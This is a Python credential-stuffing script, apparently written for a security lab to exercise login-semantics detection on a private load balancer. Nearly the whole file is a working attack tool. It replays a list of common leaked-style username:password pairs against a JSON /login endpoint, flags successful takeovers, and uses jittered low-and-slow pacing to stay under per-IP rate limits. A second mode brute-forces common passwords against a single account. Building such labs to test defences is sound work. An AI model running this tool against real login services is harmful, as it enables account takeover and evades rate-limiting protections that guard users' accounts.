#!/usr/bin/env python3
"""Credential-stuffing attack (run from attacker-01 against lb-01).

Threat 2. DISTINCT from the DoS flood on purpose:
  - DoS (threat 1): huge VOLUME of requests on ONE username (alice) -> detected by rate/saturation
    at the edge (nginx 429s, CPU). The signature is "too much traffic".
  - Credential stuffing (this): a leaked user:password dump replayed across MANY DISTINCT usernames
    from one source. Most usernames do not exist here, so the signature is a burst of `no_user`
    (plus some `bad_password`). It is paced LOW-AND-SLOW, under nginx's 10 r/s per-IP limit, so the
    threat-1 defences never see it. Detection must come from the login SEMANTICS, not the volume.

Realism: a real stuffing run uses a credential dump from some other breached site, betting that people
reuse passwords. Here the dump is mostly junk (users we do not have) with the real operators salted in:
alice/carol are tried with WRONG leaked passwords (they survive), and bob is tried with his real weak
password "password123" (a password every leak list contains) -> bob is taken over. That is the PoC.

stdlib only. Talks only to lb-01, like any outside client.

  python3 credstuffing.py --target http://192.168.100.10 --rate 60

--rate is attempts per minute. Keep it under 600 (10 r/s) to stay below the nginx per-IP limit; the
whole point is that stuffing works fine while staying quiet. Default 60/min = 1/s = low-and-slow.
"""
import argparse
import json
import random
import time
import urllib.error
import urllib.request

# A stand-in "leaked credential dump": lots of usernames that DO NOT exist on this system (every one
# is a `no_user` event), with the three real operators salted in the way a real dump would be -- the
# attacker has no idea which of these accounts exist here. Only bob's entry has his real password.
CREDENTIALS = [
    ("admin", "admin"), ("administrator", "P@ssw0rd"), ("root", "toor"),
    ("john.smith", "qwerty"), ("mike", "123456"), ("sarah", "letmein"),
    ("test", "test123"), ("guest", "guest"), ("info", "welcome1"),
    ("david", "dragon"), ("emma", "iloveyou"), ("james", "football"),
    ("operator", "operator"), ("support", "support123"), ("oliver", "monkey"),
    ("sophie", "shadow"), ("daniel", "master"), ("laura", "superman"),
    ("peter", "trustno1"), ("anna", "sunshine"), ("thomas", "password1"),
    ("jessica", "princess"), ("chris", "baseball"), ("hannah", "abc123"),
    ("alice", "alice2024"),        # REAL user, WRONG leaked password -> bad_password (survives)
    ("robert", "hunter2"), ("mary", "whatever"), ("kevin", "zxcvbn"),
    ("linda", "696969"), ("mark", "jordan23"), ("susan", "harley"),
    ("bob", "password123"),        # REAL user, REAL weak password -> *** TAKEOVER ***
    ("steve", "ranger"), ("nancy", "batman"), ("paul", "soccer"),
    ("carol", "carol123"),         # REAL user, WRONG leaked password -> bad_password (survives)
    ("george", "charlie"), ("helen", "michelle"), ("frank", "jennifer"),
    ("diana", "ashley"), ("brian", "qazwsx"), ("julia", "flower"),
]

# For --brute-user: a VERTICAL attack -- one real account, many password guesses (the opposite shape to
# the horizontal spray above). This is what the per-account lockout is meant to stop: after 5 failures
# the account locks and every further guess is rejected without even checking the password.
PASSWORDS = [
    "123456", "password", "qwerty", "letmein", "dragon", "monkey", "abc123", "111111",
    "iloveyou", "admin", "welcome", "login", "sunshine", "princess", "football",
]


def attempt(target, username, password, timeout=5):
    body = json.dumps({"username": username, "password": password}).encode()
    req = urllib.request.Request(
        target.rstrip("/") + "/login", data=body,
        headers={"Content-Type": "application/json"}, method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except urllib.error.URLError as e:
        return f"error:{e.reason}"


def main():
    p = argparse.ArgumentParser(description="Credential-stuffing attack against lb-01.")
    p.add_argument("--target", default="http://192.168.100.10", help="lb-01 base URL")
    p.add_argument("--rate", type=float, default=60.0, help="attempts per minute (keep < 600)")
    p.add_argument("--loop", action="store_true", help="repeat the dump forever (default: one pass)")
    p.add_argument("--shuffle", action="store_true", help="randomise the order each pass")
    p.add_argument("--brute-user", metavar="USER",
                   help="VERTICAL mode: try PASSWORDS against this ONE account (to trip the lockout)")
    args = p.parse_args()

    interval = 60.0 / args.rate
    if args.brute_user:
        # Vertical brute force of a single account: this is the attack the per-account lockout stops.
        creds = [(args.brute_user, pw) for pw in PASSWORDS]
        print(f"brute force: {len(creds)} passwords against '{args.brute_user}' at {args.rate}/min")
        locked_at = None
        for n, (u, pw) in enumerate(creds, 1):
            status = attempt(args.target, u, pw)
            note = ""
            if status == 200:
                note = "   *** CRACKED ***"
            print(f"  [{n:3}] {u} : {pw:12} -> {status}{note}")
            time.sleep(random.uniform(0.5 * interval, 1.5 * interval))
        print("done (brute). Watch the server: after 5 failures the account should be locked,"
              " so later guesses are rejected identically even if the password were right.")
        return

    print(f"credstuffing: {len(CREDENTIALS)} creds at {args.rate}/min against {args.target}")
    takeovers, tried = [], 0
    try:
        while True:
            creds = CREDENTIALS[:]
            if args.shuffle:
                random.shuffle(creds)
            for username, password in creds:
                status = attempt(args.target, username, password)
                tried += 1
                flag = ""
                if status == 200:
                    flag = "   *** TAKEOVER ***"
                    takeovers.append((username, password))
                print(f"  [{tried:4}] {username:14} : {password:14} -> {status}{flag}")
                time.sleep(random.uniform(0.5 * interval, 1.5 * interval))
            if not args.loop:
                break
    except KeyboardInterrupt:
        print("\ninterrupted")
    print(f"\ndone: {tried} attempts, {len(takeovers)} takeover(s): "
          + (", ".join(f"{u}:{p}" for u, p in takeovers) or "none"))


if __name__ == "__main__":
    main()
